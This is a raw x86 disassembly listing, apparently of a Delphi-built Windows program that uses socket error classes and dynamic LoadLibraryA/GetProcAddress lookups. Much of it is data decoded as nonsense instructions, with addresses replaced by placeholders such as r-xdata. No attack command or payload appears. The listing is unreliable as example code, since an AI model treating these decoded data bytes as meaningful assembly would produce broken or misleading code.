bound ebp [ ebp + 0x45 ]
jb r-xdata
inc eax
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ edx ] ah
inc ebp
dec ecx
je r-xdata
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
xchg esp eax
push es
inc edi
add [ eax ] al
add [ eax ] al
add al 0x7
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax ] al
inc edi
add [ eax + eax ] cl
add [ eax ] al
in al 0x1
inc edi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24474732
xor al [ eax ]
and al 0x45
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax + 0xc0047 ] dl
add [ eax ] al
in al 0x1
inc edi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
rcl [ esi + eax + 0x47 ] 0x0
jb r-xdata
imul esi [ ebx + 0x73 ] 0x456e6f69
add [ eax ] al
add ah ah
add [ edi ] eax
jl r-xdata
mov eax 0x4705
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004705 ] bh
add [ 0x53644945 ] bl
jb r-xdata
outsd
jb r-xdata
outsd
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
call 0x244746c2
xor al [ eax ]
and al [ ebp + 0x49 ]
outsb
push esp
jb r-xdata
mov eax eax
outsd
jb r-xdata
popad
jb r-xdata
jb r-xdata
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x244747a6
xor al [ eax ]
sbb eax 0x53644945
outsd
outsb
outsb
nop
inc eax
add [ eax + 0x7 ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7 ] bh
inc edi
add [ eax + eax ] cl
add [ eax ] al
in al 0x1
inc edi
jb r-xdata
inc ebp
jb r-xdata
outsd
jae r-xdata
outsd
jb r-xdata
imul esi [ edx + 0x65 ] 0x72724564
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx + 0xc0047 ] dh
add [ eax ] al
inc esp
inc [ esi ]
jl r-xdata
call 0x24474812
xor al [ eax ]
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
push esp
dec esp
inc ebp
js r-xdata
shl ah 0x7
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
pop es
inc edi
add [ eax + eax ] cl
add [ eax ] al
in al 0x1
inc edi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
pop es
outsb
push edx
jne r-xdata
outsd
inc ebp
jb r-xdata
dec esp
or [ edi ] al
add [ eax ] al
inc edi
add [ eax ] al
add [ eax ] al
inc eax
add [ eax - 0x73ffbfcc ] cl
nop
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
or [ edi ] al
or al 0x0
add [ eax ] al
in al 0x1
inc edi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
in al dx
push ebx
push esi
push edi
test dl dl
je r-xdata
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24474942
xor al [ eax ]
sub [ ecx ] cl
inc edi
add [ esi ] cl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
insb
imul esp [ ebx + edx * 2 + 0x6f ] 0x74656b63
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2447487a
xor al [ eax ]
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsd
insd
insd
popad
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x244748e2
xor al [ eax ]
adc [ ebp + 0x49 ] al
dec ecx
jb r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40b9c8
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
pop ebx
pop ebp
retn 0x4
jb r-xdata
lea eax [ eax ]
adc al 0x9
jae r-xdata
mov eax edi
pop edi
pop esi
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
das
stc
outsd
jb r-xdata
add [ eax ] al
inc ebp
jb r-xdata
outsb
jbe r-xdata
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
or [ edi ] eax
adc [ eax ] al
add [ eax ] al
inc esp
inc [ esi ]
jl r-xdata
outsd
jb r-xdata
outsb
inc ebp
mov ah 0x8
inc edi
add [ eax ] al
add [ eax ] al
sub_470928
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40b9c8
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_470970
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_470995
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47099c
retn
sub_4709a8
push 0xd5004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dh dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bh dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add al bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add cl bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dl bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bl bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ah bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ch bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dh bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bh bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add al al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add cl al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dl al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bl al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ah al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ch al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dh al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bh al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add al cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add cl cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dl cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bl cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ah cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ch cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dh cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bh cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ eax + 0x680000fe ] dh
push es
dec eax
add [ ecx + 0x680000fe ] dh
push es
dec eax
add [ edx + 0x680000fe ] dh
push es
dec eax
add [ ebx + 0x680000fe ] dh
push es
dec eax
add [ esi + edi * 8 + 0x6680000 ] dh
dec eax
add [ ebp + 0x680000fe ] dh
push es
dec eax
add [ esi + 0x680000fe ] dh
push es
dec eax
add [ edi + 0x680000fe ] dh
push es
dec eax
add [ eax + 0x680000fe ] bh
push es
dec eax
add [ ecx + 0x680000fe ] bh
push es
dec eax
add [ edx + 0x680000fe ] bh
push es
dec eax
add [ ebx + 0x680000fe ] bh
push es
dec eax
add [ esi + edi * 8 + 0x6680000 ] bh
dec eax
add [ ebp + 0x680000fe ] bh
push es
dec eax
add [ esi + 0x680000fe ] bh
push es
dec eax
add [ edi + 0x680000fe ] bh
push es
dec eax
add [ eax + 0x680000fe ] ah
push es
dec eax
add [ ecx + 0x680000fe ] ah
push es
dec eax
add [ edx + 0x680000fe ] ah
push es
dec eax
add [ ebx + 0x680000fe ] ah
push es
dec eax
add [ esi + edi * 8 + 0x6680000 ] ah
dec eax
add [ ebp + 0x680000fe ] ah
push es
dec eax
add [ esi + 0x680000fe ] ah
push es
dec eax
add [ edi + 0x680000fe ] ah
push es
dec eax
add [ eax + 0x680000fe ] ch
push es
dec eax
add [ ecx + 0x680000fe ] ch
push es
dec eax
add [ edx + 0x680000fe ] ch
push es
dec eax
add [ ebx + 0x680000fe ] ch
push es
dec eax
add [ esi + edi * 8 + 0x6680000 ] ch
dec eax
add [ ebp + 0x680000fe ] ch
push es
dec eax
add [ esi + 0x680000fe ] ch
push es
dec eax
add [ edi + 0x680000fe ] ch
push es
dec eax
add [ eax + 0x680000fe ] dl
push es
dec eax
add [ ecx + 0x680000fe ] dl
push es
dec eax
add [ edx + 0x680000fe ] dl
push es
dec eax
add [ ebx + 0x680000fe ] dl
push es
dec eax
add [ esi + edi * 8 + 0x6680000 ] dl
dec eax
add [ ebp + 0x680000fe ] dl
push es
dec eax
add [ esi + 0x680000fe ] dl
push es
dec eax
add [ edi + 0x680000fe ] dl
push es
dec eax
add [ eax + 0x680000fe ] bl
push es
dec eax
add [ ecx + 0x680000fe ] bl
push es
dec eax
add [ edx + 0x680000fe ] bl
push es
dec eax
add [ ebx + 0x680000fe ] bl
push es
dec eax
add [ esi + edi * 8 + 0x6680000 ] bl
dec eax
add [ ebp + 0x680000fe ] bl
push es
dec eax
add [ esi + 0x550000fe ] bl
mov ebp esp
xor eax eax
push ebp
push sub_470c1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470c24
retn
sub_470c34
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esi eax
or al 0x47
add [ eax ] bl
add [ eax ] al
add [ edi + edi * 8 + 0x46 ] al
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24474caa
xor al [ eax ]
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
int3
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x1800470c ] dl
sub_470ca8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_470d48
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_40405c
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_403558
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40b1b4
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_40405c
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404388
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40b9c8
mov ecx edi
xor edx edx
mov eax ebx
call sub_40b9c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470d4f
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40402c
retn
sub_470d4f
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_471b2c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_471bcf
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ eax + eax * 2 ]
lea ebx [ eax * 4 + rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
mov eax [ ebx + 0x4 ]
mov [ eax ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471bd6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
push 0x276d
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] 0x6
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_40905c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_470ca8
call sub_4039c0
sub_471be0
push ebx
xor eax eax
mov [ rw-data ] eax
mov ecx 0x70
mov eax rw-data
mov edx eax
mov ebx [ edx + 0x4 ]
mov edx [ edx ]
mov [ ebx ] edx
add eax 0xc
dec ecx
jne r-xdata
pop ebx
retn
sub_471c04
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_471cd1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov ax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
call GetLastError
push eax
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x8 ]
push eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
pop eax
call sub_40905c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_470ca8
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471cd8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
sub_471d0f
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_471d3c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471d43
retn
call sub_470d80
sub_471d58
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_471d7d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471d84
retn
sub_471e09
push ds
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bl
push ds
inc edi
add [ eax ] dl
add [ eax ] al
add [ eax ] cl
adc [ eax ] eax
jl r-xdata
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add al bl
and [ edi ] eax
sub al 0x2a
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
or [ eax ] al
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push ebx
je r-xdata
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffffe8475e76
inc edi
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ ecx ] dh
inc edi
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00471f ] dl
add [ eax ] al
add al ch
push ds
inc edi
add [ esp + esi + 0x40 ] bh
arpl [ ebx - 0x70 ] bp
xor al 0x1f
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx ] dh
inc edi
add [ eax + eax ] cl
add [ eax ] al
inc esp
inc [ esi ]
jl r-xdata
and al 0x32
inc eax
add [ edi ] dl
arpl [ ebx + 0x49 ] bp
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x617a696c
je r-xdata
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24475fbe
xor al [ eax ]
sbb al 0x45
dec ecx
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
pop ds
inc edi
add [ eax + eax ] cl
add [ eax ] al
call 0x7c47668f
xor al 0x40
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24475f62
xor al [ eax ]
or eax 0x53644945
je r-xdata
retn 0x4
arpl [ ebx + 0x53 ] bp
je r-xdata
arpl [ ebp + 0x65 ] sp
push 0xffffffff
inc ebp
dec ecx
push ebx
je r-xdata
outsd
outsb
je r-xdata
arpl [ ebx + 0x45 ] bp
jb r-xdata
add [ eax ] al
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
lea ecx [ esp + 0x4 ]
call sub_472020
retn
imul edi [ edx + 0x65 ] 0x65637845
push 0xffffffff
je r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0xfc00408d
pop ds
popad
insb
imul edi [ edx + 0x61 ] 0x6e6f6974
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
pop ds
inc edi
add [ eax + eax ] cl
add [ eax ] al
call 0x7c4766fb
xor al 0x40
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2447602a
xor al [ eax ]
pop ss
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
int3
rcl [ eax + 0x471f ] 0x0
sub_472020
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi eax
xor ebx ebx
inc edx
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
mov [ esi + 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov edx [ esi + 0x4 ]
mov eax esi
call sub_4720d4
inc edx
mov eax edi
add eax 0x4
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_472068
push ebp
mov ebp esp
push 0x0
push ebx
xor ebx ebx
push ebp
push sub_4720c7
push [ fs : ebx ]
mov [ fs : ebx ] esp
push ecx
mov ecx 0x2
xchg edx ecx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4720ce
lea eax [ ebp - 0x4 ]
call sub_404008
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
sub_4720d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_472126
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x68 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_470928
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47212d
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_472160
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx r-xdata
mov eax ebx
call sub_40820c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_47260c
test al al
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40405c
jmp r-xdata
mov ecx edi
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax edi
mov edx ebx
call sub_40405c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4721d8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_4725d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404008
mov eax esi
add eax 0xffffd8ec
cmp eax 0x3e
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_40905c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_40405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4725d9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
jmp [ eax * 4 + jump_table_472218 ]
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
sub_4725e0
push ebx
mov ebx eax
or edx 0xffffffff
mov eax ebx
call sub_4084bc
inc eax
jle r-xdata
xor eax eax
pop ebx
retn
mov edx 0x100
mov eax ebx
call sub_4084bc
cmp eax 0x100
jl r-xdata
mov al 0x1
pop ebx
retn
sub_47260c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_4726cb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
